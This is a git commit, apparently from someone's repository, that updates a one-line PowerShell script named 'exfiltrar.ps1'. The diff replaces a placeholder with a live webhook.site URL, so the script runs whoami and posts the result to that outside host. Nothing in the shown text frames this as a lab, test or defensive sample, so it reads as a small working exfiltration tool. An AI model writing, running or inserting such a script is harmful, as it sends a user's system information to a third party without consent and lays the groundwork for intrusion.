a22b40e3ff6ca4470c89126049d49a421f043dbe
g27587968-hue <g27587968@gmail.com>
2026-05-17 09:44:31 -0600

    Update exfiltrar.ps1

--- exfiltrar.ps1
+++ exfiltrar.ps1
@@ -1,1 +1,1 @@
-$info = whoami; Invoke-RestMethod -Uri "TU_URL_DE_WEBHOOK" -Method Post -Body $info
+$info = whoami; Invoke-RestMethod -Uri "https://webhook.site/dea66294-b968-41c4-a0f7-7a2fb79719d3" -Method Post -Body $info
